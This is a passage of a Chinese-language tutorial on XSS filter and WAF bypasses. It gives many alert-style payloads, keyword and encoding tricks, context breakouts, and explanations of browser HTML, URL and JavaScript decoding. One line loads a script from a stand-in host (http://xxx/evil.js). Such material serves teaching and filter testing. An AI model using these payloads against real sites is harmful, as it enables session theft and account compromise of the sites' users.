class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>也可以：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">`xss`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx/evil.js</span>&gt;</span></span> &lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="绕过括号"><a href="#绕过括号" class="headerlink" title="绕过括号"></a>绕过括号</h2><ul><li>throw</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&gt;</span></span></span></span><br></pre></td></tr></table></figure><ul><li>反引号</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>) == alert<span class="string">`1`</span></span><br></pre></td></tr></table></figure><h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;sCRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/sCrIpT&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h3><h4 id="利用eval-函数"><a href="#利用eval-函数" class="headerlink" title="利用eval()函数"></a>利用eval()函数</h4><p>与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">// 在js中，我们可以用反引号代替单双引号</span></span><br></pre></td></tr></table></figure><h4 id="利用top"><a href="#利用top" class="headerlink" title="利用top"></a>利用top</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="输出点总结"><a href="#输出点总结" class="headerlink" title="输出点总结"></a>输出点总结</h2><p>WAF最大的问题，在于不知道输出的位置，导致攻击者根据具体环境以及具体输出的标签类型便可以绕过。</p><h3 id="输出在属性里"><a href="#输出在属性里" class="headerlink" title="输出在属性里"></a>输出在属性里</h3><p>例如输出的位置位于value属性中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input value=&quot;[输出]&quot; type=text&gt;</span><br></pre></td></tr></table></figure><p>我们可以选择直接闭合标签：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=alert(1);&gt;</span><br><span class="line"></span><br><span class="line">// 输出后如下:</span><br><span class="line">// &lt;input value=&quot;&quot;&gt;&lt;img src=x onerror=alert(1);&gt;&quot; type=text&gt;</span><br></pre></td></tr></table></figure><p>如果 <code>&lt; &gt;</code> 被过滤的话可以换成选择使用事件来闭合属性，并将后面的引号注释掉或闭合：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; autofocus onfocus=alert(1)//</span><br><span class="line">&quot; autofocus onfocus=alert(1) &quot;</span><br><span class="line"></span><br><span class="line">// 输出后如下:</span><br><span class="line">// &lt;input value=&quot;&quot; autofocus onfocus=alert(1)//&quot; type=text&gt;</span><br></pre></td></tr></table></figure><p>同样还有很多其他的payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; onmouseover=prompt(0) x=&quot;</span><br><span class="line">&quot; onfocusin=alert(1) autofocus x=&quot;</span><br><span class="line">&quot; onfocusout=alert(1) autofocus x=&quot;</span><br><span class="line">&quot; onblur=alert(1) autofocus a=&quot;</span><br></pre></td></tr></table></figure><p>还有一些特殊的场景，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; value=&quot;[输出]&quot; /&gt;</span><br><span class="line">&lt;input value=&quot;[输出点]&quot; type=&quot;hidden&quot;/&gt;</span><br></pre></td></tr></table></figure><p>这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本。</p><h3 id="输出在HTML标签之间"><a href="#输出在HTML标签之间" class="headerlink" title="输出在HTML标签之间"></a>输出在HTML标签之间</h3><p>例如输出的位置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;body&quot;&gt;[输出]&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>直接提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可触发XSS，但是当标签是不能执行脚本的标签时，如下面这几个：</p><ul><li><code>&lt;title&gt;&lt;/title&gt;</code></li><li><code>&lt;textarea&gt;&lt;/textarea&gt;</code></li><li><code>&lt;xmp&gt;&lt;/xmp&gt;</code></li><li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li></ul><p>那么就得先把那个标签闭合（后文会讲到原理），然后在注入XSS语句，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="输出在script标签之间"><a href="#输出在script标签之间" class="headerlink" title="输出在script标签之间"></a>输出在script标签之间</h3><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var x = &quot;input&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可控位置在input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;alert(1)//</span><br><span class="line"></span><br><span class="line">// 输出后如下:</span><br><span class="line">// &lt;script&gt;var x = &quot;&quot;;alert(1)//&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a>字符编码绕过</h1><p>在XSS中，还有一个绕过关键字过滤的方法，那就是字符编码绕过。这里给出一个编码网站：<a href="https://bianma.bmcx.com/">https://bianma.bmcx.com/</a></p><p>编码属于计算机系统的基础知识，其内容写起来估计也可以出本书了，不过或多或少我们都有所了解，总的来说，编码就是将字符变为二进制数，而解码就是将二进制数还原为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程，下面大概介绍一下流程。</p><h2 id="请求网页解码流程"><a href="#请求网页解码流程" class="headerlink" title="请求网页解码流程"></a>请求网页解码流程</h2><ul><li><strong>HTML 编码&#x2F;解码</strong></li></ul><p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p><p>但是在HTML中有些字符是和关键词冲突的，比如 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是HTML标签，如果希望正确地显示预留字符，就需要在HTML中使用对应的HTML字符实体。</p><p>字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开头，后面跟着一个预定义的实体的名称，或用&amp;#开头+实体编号+分号来表示。</p><p>常见的HTML字符实体有：</p><table><thead><tr><th>显示结果</th><th>描述</th><th>实体名称</th><th>实体编号</th></tr></thead><tbody><tr><td></td><td>空格</td><td><code> </code></td><td><code> </code></td></tr><tr><td>&lt;</td><td>小于号</td><td><code>&lt;</code></td><td><code>&lt;</code></td></tr><tr><td>&gt;</td><td>大于号</td><td><code>&gt;</code></td><td><code>&gt;</code></td></tr><tr><td>&amp;</td><td>和号</td><td><code>&amp;</code></td><td><code>&amp;</code></td></tr><tr><td>“</td><td>引号</td><td><code>&quot;</code></td><td><code>&quot;</code></td></tr><tr><td>‘</td><td>撇号</td><td><code>&#39;</code>(IE不支持)</td><td><code>&#39;</code></td></tr></tbody></table><p>但并不是所有的字符都有实体名称，但是它们都有自己的实体编号。</p><p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 <code>&lt;</code> 符号（后面没有跟 <code>/</code>符号）就会进入 <strong>标签开始状态(Tag open state)</strong> ，然后转变到 <strong>标签名状态(Tag name state)</strong> 、 <strong>前属性名状态(before attribute name state)</strong> ……最后进入 <strong>数据状态(Data state)</strong> 并释放当前标签的token。当解析器处于 数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p><p>简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p><p>所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。</p><ul><li><strong>URL 解码</strong></li></ul><p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p><p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p><ul><li><strong>JavaScript 解码（只支持Unicode）</strong></li></ul><p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p><p>比如 <code>&lt;a href=&quot;javascript:alert(&#39;\u0031&#39;)&quot;&gt;test&lt;/a&gt;</code>，JavaScript 出发了 JavaScript 解释器，JavaScript 会先对内容进行解析，里边有一个转义字符<code>\u0031</code>，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为“1”，于是在完成 JavaScript 的解析之后变成了 <code>&lt;a href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;test&lt;/a&gt;</code>。</p><p><strong>下面用一个普通的XSS代码来说明一下浏览器对其解析的过程。</strong></p><ul><li><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;test&lt;/a&gt;</code></li></ul><p>首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，如：<code>https://www.baidu.com</code>，那么URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为Javascript，因此该环境中最后一步Javascript解析器还会进行解码操作，最后解析的脚本将被执行。</p><p>整个解析顺序为3个环节：HTML解码 —&gt;URL解码 —&gt;JS解码</p><p>我们可以对XSS攻击向量做这三种编码都可以成功弹框。</p><h2 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h2><p>我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML 编码主要分为10进制和16进制，格式为以 <code>&amp;#</code> 开头以分号 <code>;</code> 结尾（也可以不带分号）。</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 十进制</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 十六进制</span><br><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 也可以不带分号</span><br><span class="line">&lt;a href=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 十进制</span><br><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&gt;</span><br><span class="line"></span><br><span class="line">// 十六进制</span><br><span class="line">&lt;img src=x onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;</span><br><span class="line"></span><br><span class="line">// 也可以不带分号</span><br><span class="line">&lt;img src=x onerror=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29&gt;</span><br></pre></td></tr></table></figure><p>但是要注意，对于HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 <code>&amp;#…</code> 形式解码，转化成对应的解码字符并被放入数据缓冲区中。</p><p><strong>（1）数据状态中的字符引用：</strong>数据状态就是解析一个标签内里面的内容，如 <code>&lt;div&gt;...&lt;/div&gt;</code> 中的内容，当浏览器解析完 <code>&lt;div&gt;</code> 标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src=x onerror=alert(&quot;xss&quot;)&amp;#62;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>如下图，此时在页面上显示的是经过转义的内容：</p><p>[<img src="/../images/20210523094712-cb6a83bc-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094712-cb6a83bc-bb68-1.png)</p><p>这看上去是一个标准的标签语言，但并不会触发xss，因为当前HTML解析器处于“数据状态”，不会转换到“标签开始状态”，所以就不会建立新的标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”而不是XSS攻击向量。</p><p><strong>（2）属性值状态中的字符引用：</strong>属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的，比如下面的语句，会先对里面HTML解码，然后再继续往下执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>（3）RCDATA状态中的字符引用：</strong>然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素：</p><ol><li>空元素(Void elements)，如 <code>&lt;area&gt;</code>、<code>&lt;br&gt;</code>、<code>&lt;base&gt;</code> 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。</li><li>原始文本元素(Raw text elements)，有 <code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>。原始文本元素可以容纳文本。</li><li>RCDATA元素(RCDATA elements)，有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code>。RCDATA元素可以容纳文本和字符引用。</li><li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。</li><li>基本元素(Normal elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。</li></ol><p>注意到RCDATA元素中有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以下面这个语句触发不了XSS：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(&quot;xss&quot;)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094713-cbda5a48-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094713-cbda5a48-bb68-1.png)</p><p>但是如果直接放进去标签的内容呢，不带转义字符呢，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>同样也是不会触发XSS的：</p><p><img src="/" alt="img"></p><p>这涉及到了RCDATA的一个特殊的情况。即在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。在这个状态中，如果遇到“&lt;”字符，它会转换到“RCDATA小于号状态”。如果“&lt;”字符后没有紧跟着“&#x2F;”和对应的标签名，解析器会转换回“RCDATA状态”，并不会进入“标签开始状态”的。这意味着在RCDATA元素标签的内容中，唯一能够被解析器认做是标签的就只有 <code>&lt;/textarea&gt;</code> 或者 <code>&lt;/title&gt;</code>，因此，在 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 的内容中不会创建标签，就不会有脚本能够执行了。</p><p>另外还有一点要注意：我们从上面HTML的五类元素中还发现有一个原始文本元素 <code>&lt;script&gt;</code> 在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。浏览器看不懂中间这堆编码是和啥东西，所以也不会被执行，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094714-cc1f779a-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cc1f779a-bb68-1.png)</p><p>那么如何才能让里面的内容进行转义并执行弹窗呢，这里需要利用到XSS的一个黑魔法——“svg”，我们下文中会提及。</p><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;...&quot;&gt;xx&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;...&quot;&gt;</span><br></pre></td></tr></table></figure><p>下面给出几个实例。</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;iframe src=javascript:alert(&quot;xss&quot;)&gt;&lt;/iframe&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>注意，伪协议头 <code>javascript:</code> 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。就比如说 <code>http://www.baidu.com</code> 可以被URL编码为 <code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code>，但是不能把协议也进URL编码：<code>%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code> 。</p><p>但是伪协议头 <code>javascript:</code> 可以进行HTML编码。</p><h2 id="Javascript-编码"><a href="#Javascript-编码" class="headerlink" title="Javascript 编码"></a>Javascript 编码</h2><p>我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p><p>Javascript 中可以识别的编码类型有：</p><ul><li>Unicode 编码</li><li>八进制编码</li><li>十六进制编码</li></ul><p>一般情况下我们使用Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。</p><h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h3><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>但要注意，我们同样也不能对伪协议头 <code>javascript:</code> 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。</p><h3 id="在DOM环境中的JavaScript编码"><a href="#在DOM环境中的JavaScript编码" class="headerlink" title="在DOM环境中的JavaScript编码"></a>在DOM环境中的JavaScript编码</h3><p>对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，像下面的XSS向量是不能直接执行的：</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\141\154\145\162\164(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\x61\x6c\x65\x72\x74(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>如下图，插入之后没有任何反应：</p><p>[<img src="/../images/20210523094714-cc651728-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cc651728-bb68-1.png)</p><p>[<img src="/../images/20210523094714-cca61c3c-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cca61c3c-bb68-1.png)</p><p>要想让他们能够执行我们要将他们放在DOM环境中，即DOM型的XSS。</p><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&#x27;s&#x27;&gt;test&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var search = &quot;...&quot;;</span><br><span class="line">    document.getElementById(&#x27;s&#x27;).innerHTML = search;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>以上情况很多都是出现在你搜索后，显示你所查询的关键字，变量 <code>search</code> 是一个可控点，当我们查询一个XSS攻击向量后，变量 <code>search</code> 就会被赋值为这个XSS向量，从而插入到div标签中触发XSS，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&#x27;s&#x27;&gt;test&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var search = &quot;&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;&quot;;</span><br><span class="line">    document.getElementById(&#x27;s&#x27;).innerHTML = search;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094715-cce8331a-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094715-cce8331a-bb68-1.png)</p><p>此时如果过滤了 <code>&lt;</code>、<code>&gt;</code>、<code>&#39;</code>、<code>&quot;</code>、<code>&amp;</code>、<code>%</code> 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS向量全部编码，即 <code>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;</code> 的以下编码都可以弹窗：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Unicode编码</span><br><span class="line">\u003C\u0069\u0066\u0072\u0061\u006D\u0065\u0020\u0073\u0072\u0063\u003D\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029\u003E\u003C\u002F\u0069\u0066\u0072\u0061\u006D\u0065\u003E</span><br><span class="line"></span><br><span class="line">// 八进制编码</span><br><span class="line">\74\151\146\162\141\155\145\40\163\162\143\75\152\141\166\141\163\143\162\151\160\164\72\141\154\145\162\164\50\47\170\163\163\47\51\76\74\57\151\146\162\141\155\145\76</span><br><span class="line"></span><br><span class="line">// 十六进制编码</span><br><span class="line">\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e</span><br></pre></td></tr></table></figure><p><img src="/" 